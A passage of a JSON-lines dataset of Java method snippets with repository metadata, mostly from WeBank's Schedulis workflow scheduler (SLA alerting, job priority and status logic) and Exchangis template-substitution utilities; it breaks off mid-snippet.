"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "embeddedFlowAlter", "params": ["Alerter", "ExecutableNode", "List<SlaOption>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void embeddedFlowAlter(Alerter mailAlerter, ExecutableNode node, List<SlaOption> slaJobOptionsList){    // \u8fc7\u6ee4\u51fa\u6240\u6709\u5b50flow\u7c7b\u578b\u7684\u544a\u8b66    List<SlaOption> embeddedFlowSlaOptions = slaJobOptionsList.stream()            .filter(x -> x.getInfo().getOrDefault(SlaOption.INFO_EMBEDDED_ID, null) != null)            .collect(Collectors.toList());    String parentFlow = node.getParentFlow().getNestedId();    try {      for(SlaOption sla: embeddedFlowSlaOptions){        // embeddedFlowSla : parentFlow : subflow:subflow2 flow status: RUNNINGnode status : SUCCEEDED parent : 62 sla jobname: subflow:subflow2        String slaJobName = sla.getInfo().get(SlaOption.INFO_JOB_NAME).toString();        logger.info(\"embeddedFlowSla , parentFlow : \" + parentFlow + \" flow status: \"                + node.getParentFlow().getStatus() + \" node status : \" + node.getStatus()                + \" parent : \" + node.getParentFlow().getFlowId()                + \" sla jobname: \" + slaJobName                + \" this node name : \" + node.getId()                + \" emb \" + sla.getInfo().get(SlaOption.INFO_EMBEDDED_ID)                + \" nestedId : \" + node.getNestedId());        // \u53ea\u8981\u4e0a\u4e00\u7ea7flow\u662f\u6210\u529f\u6216\u8005\u5931\u8d25\u5373\u53ef\u53d1\u6210\u529f\uff0c\u5931\u8d25\uff0c\u5b8c\u6210\u544a\u8b66        if(node.getId().equals(sla.getInfo().get(SlaOption.INFO_EMBEDDED_ID))                && Status.isSucceeded(node.getStatus())                && parentFlow.equals(slaJobName)                && (SlaOption.TYPE_JOB_SUCCESS_EMAILS.equals(sla.getType()) || SlaOption.TYPE_JOB_FINISH_EMAILS.equals(sla.getType()))){          logger.info(\"embeddedFlowSla , \" +  1);          if(embeddedFlowSlaFlag.getOrDefault(slaJobName + \"-\" + sla.getType(), null) == null){            logger.info(\"embeddedFlowSla , \" +  2);            // FIXME Job flow event alerts, relying on third-party services.            mailAlerter.alertOnFinishSla(sla, this.flow);            // \u6807\u8bb0\u5df2\u53d1\u9001\u8fc7\u544a\u8b66            embeddedFlowSlaFlag.put(slaJobName + \"-\" + sla.getType(), true);          }        }        // \u5b50flow\u4e2d\u7684\u67d0\u4e2ajob\u5931\u8d25 \u9700\u8981\u7acb\u523b\u53d1\u51fa\u5176\u5bf9\u5e94\u7684\u5b50flow\u548c\u4e0a\u4e0a\u7ea7\u5b50flow\u7684\u5931\u8d25\u6216\u8005\u5b8c\u6210\u544a\u8b66        if(node.getStatus() == Status.FAILED || node.getStatus() == Status.FAILED_WAITING                && (SlaOption.TYPE_JOB_FAILURE_EMAILS.equals(sla.getType()) || SlaOption.TYPE_JOB_FINISH_EMAILS.equals(sla.getType()))){          logger.info(\"embeddedFlowSla , \" +  3);          // a:b:c \u5305\u542b a:b \uff0c\u89c4\u907fabc:b:c \u5305\u542b ab\uff0c          if(parentFlow.equals(slaJobName) || parentFlow.startsWith(slaJobName + \":\")){            logger.info(\"embeddedFlowSla , \" +  4);            if(embeddedFlowSlaFlag.getOrDefault(slaJobName + \"-\" + sla.getType(), null) == null) {              logger.info(\"embeddedFlowSla , \" +  5);              // FIXME Job flow event alerts, relying on third-party services.              mailAlerter.alertOnFinishSla(sla, this.flow);              embeddedFlowSlaFlag.put(slaJobName + \"-\" + sla.getType(), true);            }          }        }      }    } catch (Exception e){      logger.error(\"\u53d1\u9001\u5b50flow\u544a\u8b66\u5931\u8d25: \" + e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "handelJobFinishAlter", "params": ["JobRunner"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handelJobFinishAlter(JobRunner runner){    final ExecutableNode node = runner.getNode();    logger.info(\"SLA \u5b9a\u65f6\u4efb\u52a1\u544a\u8b66\u5904\u7406\u5f00\u59cb,\u5f53\u524d\u8282\u70b9\u72b6\u6001\u4e3a {} \"+node.getStatus());    Alerter mailAlerter = ServiceProvider.SERVICE_PROVIDER.getInstance(AlerterHolder.class).get(\"email\");    if(mailAlerter == null){      logger.warn(\"\u627e\u4e0d\u5230\u544a\u8b66\u63d2\u4ef6.\");      return;    }    ExecutableFlow exflow = runner.getNode().getExecutableFlow();    List<SlaOption> slaOptionList = exflow.getSlaOptions();    // \u6240\u6709job\u7c7b\u578b\u544a\u8b66\u5217\u8868    List<String> jobAlterTypes = Arrays.asList(SlaOption.TYPE_JOB_SUCCESS_EMAILS,            SlaOption.TYPE_JOB_FAILURE_EMAILS, SlaOption.TYPE_JOB_FINISH_EMAILS);    // \u8fc7\u6ee4\u51fa\u6240\u6709job\u7c7b\u578b\u7684\u544a\u8b66    List<SlaOption> slaJobOptionsList = slaOptionList.stream()            .filter(x -> jobAlterTypes.contains(x.getType())).collect(Collectors.toList());    // \u5b50flow\u544a\u8b66\u5904\u7406    embeddedFlowAlter(mailAlerter, node, slaJobOptionsList);    // \u4ecejob\u544a\u8b66\u5217\u8868\u4e2d\u83b7\u53d6\u6240\u6709\u544a\u8b66\u7684job\u7684\u540d\u5b57\u53bb\u91cd    Set<String> slaJobAlterName = slaJobOptionsList.stream()            .map(x -> (String)x.getInfo().get(SlaOption.INFO_JOB_NAME)).collect(Collectors.toSet());    // \u5224\u65ad\u5f53\u524djob\u662f\u5426\u9700\u8981\u544a\u8b66    if(!slaJobAlterName.contains(node.getNestedId())){      return;    }    if (null != slaJobOptionsList) {      try {        for (SlaOption slaOption : slaJobOptionsList) {          // \u5224\u65ad\u5f53\u524d\u544a\u8b66\u4fe1\u606f\u7684job\u540d\u662f\u5426\u4e0e\u7b49\u4e8e\u8be5job\u540d\u5b57          if(!((String)slaOption.getInfo().get(SlaOption.INFO_JOB_NAME)).equals(node.getNestedId())){            continue;          }          logger.info(\"1.\u4efb\u52a1Job: \" + node.getNestedId() + \" \u5f00\u59cb\u53d1\u9001 \u544a\u8b66\" + \" job status is \" + node.getStatus());          if (SlaOption.TYPE_JOB_FAILURE_EMAILS.equals(slaOption.getType())                  && (node.getStatus().equals(Status.FAILED) || node.getStatus().equals(Status.FAILED_WAITING))) {            logger.info(\"\u4efb\u52a1Job \u6267\u884c\u5931\u8d25 \u5f00\u59cb\u53d1\u9001 \u544a\u8b66\");            // FIXME Job flow event alerts, relying on third-party services.            mailAlerter.alertOnFinishSla(slaOption, flow);          } else if (SlaOption.TYPE_JOB_SUCCESS_EMAILS.equals(slaOption.getType()) && Status.isSucceeded(node.getStatus())) {            logger.info(\"\u4efb\u52a1Job \u6267\u884c\u6210\u529f \u5f00\u59cb\u53d1\u9001 \u544a\u8b66\");            // FIXME Job flow event alerts, relying on third-party services.            mailAlerter.alertOnFinishSla(slaOption, flow);          } else if (SlaOption.TYPE_JOB_FINISH_EMAILS.equals(slaOption.getType())) {            logger.info(\"\u4efb\u52a1Job \u6267\u884c\u5b8c\u6210 \u5f00\u59cb\u53d1\u9001 \u544a\u8b66\");            // FIXME Job flow event alerts, relying on third-party services.            mailAlerter.alertOnFinishSla(slaOption, flow);          }        }      } catch (Exception e) {        logger.error(\"\u53d1\u9001job\u544a\u8b66\u5931\u8d25\" + e);      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "runReadyJobByPriority", "params": ["ExecutableNode", "String"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean runReadyJobByPriority(final ExecutableNode node,final String preNodeId) throws IOException {    if (Status.isStatusFinished(node.getStatus())            || Status.isStatusRunning(node.getStatus())) {      return false;    }    final Status nextNodeStatus = getImpliedStatus(node, this.flow.getOtherOption());    if (nextNodeStatus == null) {      return false;    }    if (nextNodeStatus == Status.CANCELLED) {      this.logger.info(\"Cancelling '\" + node.getNestedId()              + \"' due to prior errors.\");      node.cancelNode(System.currentTimeMillis());      finishExecutableNode(node);    } else if (nextNodeStatus == Status.SKIPPED) {      this.logger.info(\"Skipping disabled job '\" + node.getId() + \"'.\");      node.skipNode(System.currentTimeMillis());      finishExecutableNode(node);    } else if (nextNodeStatus == Status.READY) {      if (node instanceof ExecutableFlowBase) {        final ExecutableFlowBase flow = ((ExecutableFlowBase) node);        this.logger.info(\"Running flow '\" + flow.getNestedId() + \"'.\");        flow.setStatus(Status.RUNNING);        flow.setStartTime(System.currentTimeMillis());        prepareJobProperties(flow);        for (final String startNodeId : ((ExecutableFlowBase) node).getStartNodes()) {          final ExecutableNode startNode = flow.getExecutableNode(startNodeId);          runReadyJob(startNode);        }      } else {        logger.info(\"\u7b49\u5f85\u4e0a\u4e00\u4e2a\u4f18\u5148\u7ea7job \" + preNodeId + \" \u6267\u884c\u5b8c\u6bd5\");        logger.info(\"\u5f53\u524d\u7b49\u5f85\u6267\u884cjob \" + node.getId() + \"\");        runExecutableNodeByPriority(node);      }    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "runExecutableNodeByPriority", "params": ["ExecutableNode"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void runExecutableNodeByPriority(final ExecutableNode node) throws IOException {    // Collect output props from the job's dependencies.    prepareJobProperties(node);    node.setStatus(Status.QUEUED);    final JobRunner runner = createJobRunner(node);    this.logger.info(\"Submitting job '\" + node.getNestedId() + \"' to run.\");    try {      this.executorPriorityService.submit(runner);      this.activeJobRunners.add(runner);    } catch (final RejectedExecutionException e) {      this.logger.error(e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isSkippedDay", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isSkippedDay(ExecutableNode node){    Map<String, String> jobCronExpression = ((Map<String, String>) this.flow.getOtherOption().get(\"job.cron.expression\"));    if(!(node instanceof ExecutableFlowBase) && jobCronExpression != null) {      String cronExpresion = jobCronExpression.get(node.getNestedId());      if(StringUtils.isNotBlank(cronExpresion)){        if(this.flow.getSubmitTime() != -1 && Utils.checkDateTime(this.flow.getSubmitTime(),1, cronExpresion)){          logger.info(\"job: \" + node.getNestedId() + \", cron:\" + cronExpresion + \", skiped.\");          return true;        }      }    }    return false;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getImpliedStatus", "params": ["ExecutableNode", "Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "  public Status getImpliedStatus(final ExecutableNode node, final Map<String, Object> faultOption) {    // If it's running or finished with 'SUCCEEDED', than don't even    // bother starting this job.    if (Status.isStatusRunning(node.getStatus())            || Status.isSucceeded(node.getStatus())) {      return null;    }    // Go through the node's dependencies. If all of the previous job's    // statuses is finished and not FAILED or KILLED, than we can safely    // run this job.    Status status = Status.READY;    // Go through the node's dependencies. If all of the previous job's    // statuses is finished and not FAILED or KILLED, than we can safely    // run this job.    final ExecutableFlowBase flow = node.getParentFlow();    boolean shouldKill = false;    boolean jobSkipFailedOptions = false;    // FIXME\u00a0When the execution of a dependent job fails and the current job to be executed is disabled, it will cause the job stream to fail and retry. The task cannot be killed, and the task is always in the killing state. The current solution is that if the execution of the dependent job fails, the entire execution link All jobs are canceled, and the status of the disabled job is skipped after execution.    if(node.getCondition() == null && node.getConditionOnJobStatus().equals(ConditionOnJobStatus.ALL_SUCCESS)) {      for (final String dependency : node.getInNodes()) {        final ExecutableNode dependencyNode = flow.getExecutableNode(dependency);        final Status depStatus = dependencyNode.getStatus();        logger.info(\"depNode:\" + dependencyNode.getNestedId() + \" status: \" + depStatus.toString() + \" isDependentlinkFailed: \" + dependencyNode.isDependentlinkFailed());        if (!Status.isStatusFinished(depStatus)) {          return null;        } else if (depStatus == Status.CANCELLED                || depStatus == Status.KILLED) {          // We propagate failures as KILLED states.          shouldKill = true;          setDependentlinkFailed(node, true);        } else if (depStatus == Status.FAILED) {          setDependentlinkFailed(node, true);          // \u8bbe\u7f6e\u6267\u884c\u8df3\u8fc7\u67d0\u4e2ajob          List<String> skipFaultJobList = (ArrayList) faultOption.get(\"jobSkipFailedOptions\");          if (null != skipFaultJobList && (skipFaultJobList.contains(dependencyNode.getNestedId()) || skipFaultJobList.contains(dependencyNode.getId()))) {            logger.info(\"\u7528\u6237\u5df2\u8bbe\u7f6e\u9519\u8bef\u8df3\u8fc7\u7b56\u7565\uff0c\u8df3\u8fc7\u9519\u8bef\u72b6\u6001 Job:\" + dependencyNode.getNestedId() + \" \u7ee7\u7eed\u6267\u884c\u3002\");            jobSkipFailedOptions = true;          } else {            shouldKill = true;          }        }        if(dependencyNode.isDependentlinkFailed()){          shouldKill = true;          setDependentlinkFailed(node, true);        }      }    }    if(!jobSkipFailedOptions) {      // Check if condition on job status is satisfied \u6761\u4ef6\u6267\u884c\u5b8f\u5224\u65ad      switch (checkConditionOnJobStatus(node)) {        case FAILED:          this.logger.info(\"Condition on job status: \" + node.getConditionOnJobStatus() + \" is \"                  + \"evaluated to false for \" + node.getId());          status = Status.CANCELLED;          break;        // Condition not satisfied yet, need to wait        case PENDING:          return null;        default:          break;      }      // \u6761\u4ef6\u6267\u884c\u8868\u8fbe\u5f0f\u8ba1\u7b97      if (status != Status.CANCELLED && !isConditionOnRuntimeVariableMet(node)) {        status = Status.CANCELLED;      }    }    // If it's disabled but ready to run, we want to make sure it continues    // being disabled.    //FIXME\u00a0isSkippedDay means skipping tasks by time. If the current execution time is equal to the time set by the job to skip execution, the task skips execution.    if (node.getStatus() == Status.DISABLED        || node.getStatus() == Status.SKIPPED || isSkippedDay(node)) {      logger.info(\"set job: \" + node.getNestedId() + \" skipped\");      return Status.SKIPPED;    }    // If the flow has failed, and we want to finish only the currently running    // jobs, we just    // kill everything else. We also kill, if the flow has been cancelled.    if (this.flowFailed            && this.failureAction == ExecutionOptions.FailureAction.FINISH_CURRENTLY_RUNNING) {      return Status.CANCELLED;    } else if (shouldKill || isKilled()) {      logger.info(\"this flow has been killed or dependent link has been failed, this job:\" + node.getNestedId() + \" will be canceled\");      return Status.CANCELLED;    }    // \u6240\u6709\u68c0\u67e5\u901a\u8fc7\uff0c\u8bbe\u7f6e\u51c6\u5907\u72b6\u6001    return status;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "nodeSkipFailedCheck", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean nodeSkipFailedCheck(final ExecutableNode node) {    if (node instanceof ExecutableFlowBase) {      return false;    }    //\u83b7\u53d6\u7528\u6237\u8bbe\u7f6e\u7684\u9519\u8bef\u8df3\u8fc7job\u5217\u8868    List<String> skipFaultJobList = (ArrayList)this.flow.getOtherOption().get(\"jobSkipFailedOptions\");    if(null != skipFaultJobList && (skipFaultJobList.contains(node.getNestedId()) || skipFaultJobList.contains(node.getId()))){      return false;    }else{      return true;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "verifyPriority", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean verifyPriority(final String priorityLev){    //\u6821\u9a8c\u901a\u8fc7    if(pattern.matcher(priorityLev).matches()){      return false;    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getFlowMetadata", "params": ["FlowRunner"], "throws": null, "modifiers": ["synchronized", "private"], "return_type": "Map<String,String>", "snippet": "    private synchronized Map<String, String> getFlowMetadata(final FlowRunner flowRunner) {      final ExecutableFlow flow = flowRunner.getExecutableFlow();      final Props props = ServiceProvider.SERVICE_PROVIDER.getInstance(Props.class);      final Map<String, String> metaData = new HashMap<>();      metaData.put(\"flowName\", flow.getId());      metaData.put(\"azkabanHost\", props.getString(AZKABAN_SERVER_HOST_NAME, \"unknown\"));      metaData.put(\"projectName\", flow.getProjectName());      metaData.put(\"submitUser\", flow.getSubmitUser());      metaData.put(\"executionId\", String.valueOf(flow.getExecutionId()));      metaData.put(\"startTime\", String.valueOf(flow.getStartTime()));      metaData.put(\"submitTime\", String.valueOf(flow.getSubmitTime()));      return metaData;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunnerEventListener", "extends": null, "implements": ["EventListener"], "modifiers": ["private"]}}, {"method_name": "handleEvent", "params": ["Event"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void handleEvent(final Event event) {      if (event.getType() == EventType.FLOW_STARTED) {        final FlowRunner flowRunner = (FlowRunner) event.getRunner();        final ExecutableFlow flow = flowRunner.getExecutableFlow();        FlowRunner.this.logger.info(\"Flow started: \" + flow.getId());        FlowRunner.this.azkabanEventReporter.report(event.getType(), getFlowMetadata(flowRunner));      } else if (event.getType() == EventType.FLOW_FINISHED) {        final FlowRunner flowRunner = (FlowRunner) event.getRunner();        final ExecutableFlow flow = flowRunner.getExecutableFlow();        FlowRunner.this.logger.info(\"Flow ended: \" + flow.getId());        final Map<String, String> flowMetadata = getFlowMetadata(flowRunner);        flowMetadata.put(\"endTime\", String.valueOf(flow.getEndTime()));        flowMetadata.put(\"flowStatus\", flow.getStatus().name());        FlowRunner.this.azkabanEventReporter.report(event.getType(), flowMetadata);      }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunnerEventListener", "extends": null, "implements": ["EventListener"], "modifiers": ["private"]}}, {"method_name": "getJobMetadata", "params": ["JobRunner"], "throws": null, "modifiers": ["synchronized", "private"], "return_type": "Map<String,String>", "snippet": "    private synchronized Map<String, String> getJobMetadata(final JobRunner jobRunner) {      final ExecutableNode node = jobRunner.getNode();      final Props props = ServiceProvider.SERVICE_PROVIDER.getInstance(Props.class);      final Map<String, String> metaData = new HashMap<>();      metaData.put(\"jobId\", node.getId());      metaData.put(\"executionID\", String.valueOf(node.getExecutableFlow().getExecutionId()));      metaData.put(\"flowName\", node.getExecutableFlow().getId());      metaData.put(\"startTime\", String.valueOf(node.getStartTime()));      metaData.put(\"jobType\", String.valueOf(node.getType()));      metaData.put(\"azkabanHost\", props.getString(AZKABAN_SERVER_HOST_NAME, \"unknown\"));      metaData.put(\"jobProxyUser\",              jobRunner.getProps().getString(JobProperties.USER_TO_PROXY, null));      return metaData;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "JobRunnerEventListener", "extends": null, "implements": ["EventListener"], "modifiers": ["private"]}}, {"method_name": "handleEvent", "params": ["Event"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void handleEvent(final Event event) {      if (event.getType() == EventType.JOB_STATUS_CHANGED) {        updateFlow();      } else if (event.getType() == EventType.JOB_FINISHED) {        // FIXME\u00a0The task execution needs to update the database information.        updateFlow();        try {          if(FlowRunner.this.executorServiceForCheckers!=null) {            FlowRunner.this.logger.info(\"current active threads : \" + FlowRunner.this.executorServiceForCheckers.getActiveCount());          }        } catch (Exception e){          FlowRunner.this.logger.error(\"\u83b7\u53d6\u5f53\u524d\u6d3b\u8dc3\u7684\u7ebf\u7a0b\u6570\u5931\u8d25:\" + e);        }        final EventData eventData = event.getData();        final JobRunner jobRunner = (JobRunner) event.getRunner();        final ExecutableNode node = jobRunner.getNode();        FlowRunner.this.logger.info(\"finished node: \" + node.getNestedId());        if (FlowRunner.this.azkabanEventReporter != null) {          final Map<String, String> jobMetadata = getJobMetadata(jobRunner);          jobMetadata.put(\"jobStatus\", node.getStatus().name());          jobMetadata.put(\"endTime\", String.valueOf(node.getEndTime()));          FlowRunner.this.azkabanEventReporter.report(event.getType(), jobMetadata);        }        final long seconds = (node.getEndTime() - node.getStartTime()) / 1000;        synchronized (FlowRunner.this.mainSyncObj) {          FlowRunner.this.logger.info(\"Job \" + eventData.getNestedId() + \" finished with status \"                  + eventData.getStatus() + \" in \" + seconds + \" seconds\");          // Cancellation is handled in the main thread, but if the flow is          // paused, the main thread is paused too.          // This unpauses the flow for cancellation.          if (FlowRunner.this.flowPaused && eventData.getStatus() == Status.FAILED              && FlowRunner.this.failureAction == FailureAction.CANCEL_ALL) {            FlowRunner.this.flowPaused = false;          }          FlowRunner.this.finishedNodes.add(node);          FlowRunner.this.activeJobRunners.remove(jobRunner);          // FIXME\u00a0Added task processing for FAILED_WAITING status.          failedWaitingJobHandle(node);          node.getParentFlow().setUpdateTime(System.currentTimeMillis());          interrupt();          fireEventListeners(event);        }        // FIXME\u00a0Added sla alarms for job and sub-job streams.        handelJobFinishAlter(jobRunner);      } else if (event.getType() == EventType.JOB_STARTED) {        final EventData eventData = event.getData();        FlowRunner.this.logger.info(\"Job Started: \" + eventData.getNestedId());        final JobRunner jobRunner = (JobRunner) event.getRunner();        if (FlowRunner.this.azkabanEventReporter != null) {          FlowRunner.this.azkabanEventReporter.report(event.getType(), getJobMetadata(jobRunner));        }        // FIXME\u00a0Added job and subflow execution timeout alarms.        handleJobAndEmbeddedFlowExecTimeoutAlter(jobRunner, eventData);      }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "JobRunnerEventListener", "extends": null, "implements": ["EventListener"], "modifiers": ["private"]}}, {"method_name": "inject", "params": ["String", "Object", "boolean", "boolean", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String inject(String template, Object[] params, boolean useDefault, boolean escape, boolean placeholder){        Matcher matcher = REGEX.matcher(template);        StringBuffer sb = new StringBuffer();        int offset = 0;        while(matcher.find()){            String value = \"\";            String extra = \"\";            if( offset < params.length && null != params[offset] ){                Object paramsV = params[offset];                if( paramsV instanceof  String || paramsV instanceof Enum ||                        paramsV.getClass().isPrimitive() ||                        isWrapClass(paramsV.getClass())){                    value = escape? StringEscapeUtils.escapeJava(String.valueOf(paramsV))                        : String.valueOf(paramsV);                }else{                    value = GsonUtil.toJson(paramsV);                    value = escape? StringEscapeUtils.escapeJava(value) : value;                }                if( null != matcher.group(1)                        && !\"\".equals(matcher.group(1))){                    extra = matcher.group(1);                }                offset ++;            }else if(null != matcher.group(4) && useDefault){//                value = escape? StringEscapeUtils.escapeJava(String.valueOf(matcher.group(4)))//                        : matcher.group(4);                //For default not to escape                value = matcher.group(4);            }            if(StringUtils.isBlank(value) && !useDefault){                value = \"\\\"\" + (escape?StringEscapeUtils.escapeJava(matcher.group(3))                        : matcher.group(3));            }else if(!\"$\".equals(matcher.group(2)) && placeholder){                value = \"\\\"\" + StringEscapeUtils.escapeJava(value) + \"\\\"\";            }            String result = (extra + value).replace(\"$\", \"\\\\$\");            matcher.appendReplacement(sb, result);        }        matcher.appendTail(sb);        return sb.toString().replace(\"\\\\$\",\"$\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "inject", "params": ["String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String inject(String pattern, Object[] params){        return inject(pattern, params, true, true, true);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "inject", "params": ["String", "Map<String,Object>", "boolean", "boolean", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String inject(String template, Map<String, Object> params, boolean useDefault, boolean escape, boolean placeholder){        Matcher matcher = REGEX.matcher(template);        StringBuffer sb = new StringBuffer();        //will be more faster?        while(matcher.find()){            String injected = matcher.group(3);            if(null !=  injected  && !\"\".equals(injected)){                int flag = 0;                String value = \"\";                String extra = \"\";                for(Map.Entry<String, Object> entry : params.entrySet()){                    if(injected.equals(entry.getKey()) && null != entry.getValue()){                        Object entryV = entry.getValue();                        if(entryV instanceof  String || entryV instanceof Enum ||                                entryV.getClass().isPrimitive() ||                                isWrapClass(entryV.getClass())){                            value = escape? StringEscapeUtils.escapeJava(String.valueOf(entryV))                            : String.valueOf(entryV);                        }else{                            value = GsonUtil.toJson(entryV);                            value = escape? StringEscapeUtils.escapeJava(value) : value;                        }                        if(null != matcher.group(1)                                || !\"\".equals(matcher.group(1))){                            extra = matcher.group(1);                        }                        flag = 1;                        break;                    }                }                if(flag == 0 && null != matcher.group(4) && useDefault){//                value = escape? StringEscapeUtils.escapeJava(String.valueOf(matcher.group(4)))//                        : matcher.group(4);                    //For default not to escape                    value = matcher.group(4);                }                if(StringUtils.isBlank(value) && !useDefault){                    value = \"\\\"*#{\" + (escape?StringEscapeUtils.escapeJava(matcher.group(3))                            : matcher.group(3)) + \"}*\\\"\";                } else if(!\"$\".equals(matcher.group(2)) && placeholder){                    value = \"\\\"\" + StringEscapeUtils.escapeJava(value) + \"\\\"\";                }                String result = (extra + value).replace(\"$\", \"\\\\$\");                matcher.appendReplacement(sb, result);            }        }        matcher.appendTail(sb);        String print = sb.toString();        return print.replace(\"\\\\$\",\"$\").replace(\"\",\"\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "injectPattern", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String injectPattern(String template, String valuePattern){        Matcher matcher = REGEX.matcher(template);        StringBuffer sb  = new StringBuffer();        while(matcher.find()){            String extra = matcher.group(1);            String value = StringEscapeUtils.escapeJava(matcher.group(3));            value = (extra + value.replaceAll(\"[\\\\s\\\\S]+\", valuePattern))                    .replace(\"$\", \"\\\\$\");            matcher.appendReplacement(sb, value);        }        matcher.appendTail(sb);        return sb.toString().replace(\"\\\\$\", \"$\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "inject", "params": ["String", "Map<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String inject(String template, Map<String, Object> params){        return inject(template, params, true, true, true);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isWrapClass", "params": ["Class"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean isWrapClass(Class clz){        try{            return ((Class)clz.getField(\"TYPE\").get(null)).isPrimitive();        }catch(Exception e){            return false;        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/PatternInjectUtils.java", "stars": "23", "class": {"name": "PatternInjectUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBaseUrl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBaseUrl() {        if (!TextUtils.isEmpty(baseUrl)){            // Retrofit$Builder java.lang.IllegalArgumentException: baseUrl must end in /            if 